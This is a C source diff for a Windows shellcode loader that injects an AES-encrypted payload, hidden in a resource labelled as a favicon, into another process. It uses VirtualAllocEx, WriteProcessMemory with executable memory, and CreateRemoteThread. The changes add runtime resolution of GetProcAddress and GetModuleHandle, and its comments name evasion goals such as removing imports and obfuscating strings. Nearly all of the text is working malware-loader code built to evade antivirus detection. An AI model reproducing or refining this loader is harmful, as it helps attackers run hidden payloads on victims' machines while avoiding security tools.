@@ -1,5 +1,5 @@
 // X dynamically resolve all function calls
-// - dynamically resolve GetProcAddress, GetModuleAddress
+// - dynamically resolve GetProcAddress, GetModuleHandle
 // - remove all imports
 // - obfuscate strings (use different key)
 
@@ -11,13 +11,24 @@
 #include "resources.h"
 #include "helpers.h"
 
+#pragma comment(linker, "/entry:WinMain")
+
 char key[] = "mysecretkeee";
+
+
+// Dynamically resolve GetProcAddress, GetModuleHandle
+typedef HMODULE (WINAPI * GetModuleHandle_t)(LPCWSTR lpModuleName);
+typedef FARPROC (WINAPI * GetProcAddress_t)(HMODULE hModule, LPCSTR lpProcName);
+
+GetModuleHandle_t pGetModuleHandle = (GetModuleHandle_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "GetModuleHandleW");
+GetProcAddress_t pGetProcAddress = (GetProcAddress_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "GetProcAddress");
+
 
 // TODO: Change this somehow
 // Load crypto module, does not get loaded when none of the functions are being statically resolved
 typedef HMODULE (WINAPI * LoadLibrary_t)(LPCSTR lpFileName);
-LoadLibrary_t p_LoadLibraryA = (LoadLibrary_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "LoadLibraryA");
-HMODULE hCryptModule = p_LoadLibraryA("ADVAPI32.DLL");
+LoadLibrary_t pLoadLibraryA = (LoadLibrary_t) pGetProcAddress(pGetModuleHandle(L"KERNEL32.DLL"), "LoadLibraryA");
+HMODULE hCryptModule = pLoadLibraryA("ADVAPI32.DLL");
 
 // Resolved functions
 typedef HRSRC (WINAPI * FindResource_t)(HMODULE hModule, LPCSTR lpName, LPCSTR lpType);
@@ -46,7 +57,7 @@ typedef BOOL (WINAPI * CryptDestroyHash_t)(HCRYPTHASH hHash);
 typedef BOOL (WINAPI * CryptDestroyKey_t)(HCRYPTKEY hKey);
 
 // Globally used function
-CloseHandle_t pCloseHandle = (CloseHandle_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "CloseHandle");
+CloseHandle_t pCloseHandle = (CloseHandle_t) pGetProcAddress(pGetModuleHandle(L"KERNEL32.DLL"), "CloseHandle");
 
 void XOR(char *data, size_t data_len, char *key, size_t key_len) {
 	int j;
@@ -65,14 +76,14 @@ int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keyl
     HCRYPTHASH hHash;
     HCRYPTKEY hKey;
 
-    CryptAcquireContextW_t pCryptAcquireContextW = (CryptAcquireContextW_t) hlpGetProcAddress(hlpGetModuleHandle(L"ADVAPI32.DLL"), "CryptAcquireContextW");
-    CryptCreateHash_t pCryptCreateHash = (CryptCreateHash_t) hlpGetProcAddress(hlpGetModuleHandle(L"ADVAPI32.DLL"), "CryptCreateHash");
-    CryptHashData_t pCryptHashData = (CryptHashData_t) hlpGetProcAddress(hlpGetModuleHandle(L"ADVAPI32.DLL"), "CryptHashData");
-    CryptDeriveKey_t pCryptDeriveKey = (CryptDeriveKey_t) hlpGetProcAddress(hlpGetModuleHandle(L"ADVAPI32.DLL"), "CryptDeriveKey");
-    CryptDecrypt_t pCryptDecrypt = (CryptDecrypt_t) hlpGetProcAddress(hlpGetModuleHandle(L"ADVAPI32.DLL"), "CryptDecrypt");
-    CryptReleaseContext_t pCryptReleaseContext = (CryptReleaseContext_t) hlpGetProcAddress(hlpGetModuleHandle(L"ADVAPI32.DLL"), "CryptReleaseContext");
-    CryptDestroyHash_t pCryptDestroyHash = (CryptDestroyHash_t) hlpGetProcAddress(hlpGetModuleHandle(L"ADVAPI32.DLL"), "CryptDestroyHash");
-    CryptDestroyKey_t pCryptDestroyKey = (CryptDestroyKey_t) hlpGetProcAddress(hlpGetModuleHandle(L"ADVAPI32.DLL"), "CryptDestroyKey");
+    CryptAcquireContextW_t pCryptAcquireContextW = (CryptAcquireContextW_t) pGetProcAddress(pGetModuleHandle(L"ADVAPI32.DLL"), "CryptAcquireContextW");
+    CryptCreateHash_t pCryptCreateHash = (CryptCreateHash_t) pGetProcAddress(pGetModuleHandle(L"ADVAPI32.DLL"), "CryptCreateHash");
+    CryptHashData_t pCryptHashData = (CryptHashData_t) pGetProcAddress(pGetModuleHandle(L"ADVAPI32.DLL"), "CryptHashData");
+    CryptDeriveKey_t pCryptDeriveKey = (CryptDeriveKey_t) pGetProcAddress(pGetModuleHandle(L"ADVAPI32.DLL"), "CryptDeriveKey");
+    CryptDecrypt_t pCryptDecrypt = (CryptDecrypt_t) pGetProcAddress(pGetModuleHandle(L"ADVAPI32.DLL"), "CryptDecrypt");
+    CryptReleaseContext_t pCryptReleaseContext = (CryptReleaseContext_t) pGetProcAddress(pGetModuleHandle(L"ADVAPI32.DLL"), "CryptReleaseContext");
+    CryptDestroyHash_t pCryptDestroyHash = (CryptDestroyHash_t) pGetProcAddress(pGetModuleHandle(L"ADVAPI32.DLL"), "CryptDestroyHash");
+    CryptDestroyKey_t pCryptDestroyKey = (CryptDestroyKey_t) pGetProcAddress(pGetModuleHandle(L"ADVAPI32.DLL"), "CryptDestroyKey");
 
     if (!pCryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
         return -1;
@@ -104,10 +115,10 @@ int FindTarget(const char *procname) {
     PROCESSENTRY32 pe32;
     int pid = 0;
 
-    CreateToolhelp32Snapshot_t pCreateToolhelp32Snapshot = (CreateToolhelp32Snapshot_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "CreateToolhelp32Snapshot");
-    Process32First_t pProcess32First = (Process32First_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "Process32First");
-    Process32Next_t pProcess32Next = (Process32Next_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "Process32Next");
-    lstrcmpiA_t plstrcmpiA = (lstrcmpiA_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "lstrcmpiA");
+    CreateToolhelp32Snapshot_t pCreateToolhelp32Snapshot = (CreateToolhelp32Snapshot_t) pGetProcAddress(pGetModuleHandle(L"KERNEL32.DLL"), "CreateToolhelp32Snapshot");
+    Process32First_t pProcess32First = (Process32First_t) pGetProcAddress(pGetModuleHandle(L"KERNEL32.DLL"), "Process32First");
+    Process32Next_t pProcess32Next = (Process32Next_t) pGetProcAddress(pGetModuleHandle(L"KERNEL32.DLL"), "Process32Next");
+    lstrcmpiA_t plstrcmpiA = (lstrcmpiA_t) pGetProcAddress(pGetModuleHandle(L"KERNEL32.DLL"), "lstrcmpiA");
             
     hProcSnap = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
@@ -137,10 +148,10 @@ int Inject(HANDLE hProc, unsigned char *payload, unsigned int payload_len) {
     HANDLE hThread = NULL;
     DWORD oldProtect = 0;
 
-    VirtualAllocEx_t pVirtualAllocEx = (VirtualAllocEx_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "VirtualAllocEx");
-    WriteProcessMemory_t pWriteProcessMemory = (WriteProcessMemory_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "WriteProcessMemory");
-    CreateRemoteThread_t pCreateRemoteThread = (CreateRemoteThread_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "CreateRemoteThread");
-    WaitForSingleObject_t pWaitForSingleObject = (WaitForSingleObject_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "WaitForSingleObject");
+    VirtualAllocEx_t pVirtualAllocEx = (VirtualAllocEx_t) pGetProcAddress(pGetModuleHandle(L"KERNEL32.DLL"), "VirtualAllocEx");
+    WriteProcessMemory_t pWriteProcessMemory = (WriteProcessMemory_t) pGetProcAddress(pGetModuleHandle(L"KERNEL32.DLL"), "WriteProcessMemory");
+    CreateRemoteThread_t pCreateRemoteThread = (CreateRemoteThread_t) pGetProcAddress(pGetModuleHandle(L"KERNEL32.DLL"), "CreateRemoteThread");
+    WaitForSingleObject_t pWaitForSingleObject = (WaitForSingleObject_t) pGetProcAddress(pGetModuleHandle(L"KERNEL32.DLL"), "WaitForSingleObject");
 
     pRemoteCode = pVirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     pWriteProcessMemory(hProc, pRemoteCode, payload, payload_len, NULL);
@@ -166,13 +177,13 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
     unsigned char AESkey[] = { 0x5a, 0xdc, 0x9c, 0xd0, 0xfd, 0x9d, 0x46, 0xc1, 0xd9, 0xe, 0xea, 0x75, 0x99, 0x1d, 0xfc, 0x9 };
 
-    FindResource_t pFindResource = (FindResource_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "FindResourceA");
-    LoadResource_t pLoadResource = (LoadResource_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "LoadResource");
-    LockResource_t pLockResource = (LockResource_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "LockResource");
-    SizeofResource_t pSizeofResource = (SizeofResource_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "SizeofResource");
-    VirtualAlloc_t pVirtualAlloc = (VirtualAlloc_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "VirtualAlloc");
-    RtlMoveMemory_t pRtlMoveMemory = (RtlMoveMemory_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "RtlMoveMemory");
-    OpenProcess_t pOpenProcess = (OpenProcess_t) hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), "OpenProcess");
+    FindResource_t pFindResource = (FindResource_t) pGetProcAddress(pGetModuleHandle(L"KERNEL32.DLL"), "FindResourceA");
+    LoadResource_t pLoadResource = (LoadResource_t) pGetProcAddress(pGetModuleHandle(L"KERNEL32.DLL"), "LoadResource");
+    LockResource_t pLockResource = (LockResource_t) pGetProcAddress(pGetModuleHandle(L"KERNEL32.DLL"), "LockResource");
+    SizeofResource_t pSizeofResource = (SizeofResource_t) pGetProcAddress(pGetModuleHandle(L"KERNEL32.DLL"), "SizeofResource");
+    VirtualAlloc_t pVirtualAlloc = (VirtualAlloc_t) pGetProcAddress(pGetModuleHandle(L"KERNEL32.DLL"), "VirtualAlloc");
+    RtlMoveMemory_t pRtlMoveMemory = (RtlMoveMemory_t) pGetProcAddress(pGetModuleHandle(L"KERNEL32.DLL"), "RtlMoveMemory");
+    OpenProcess_t pOpenProcess = (OpenProcess_t) pGetProcAddress(pGetModuleHandle(L"KERNEL32.DLL"), "OpenProcess");
 
 	// Extract payload from resources section
 	res = pFindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
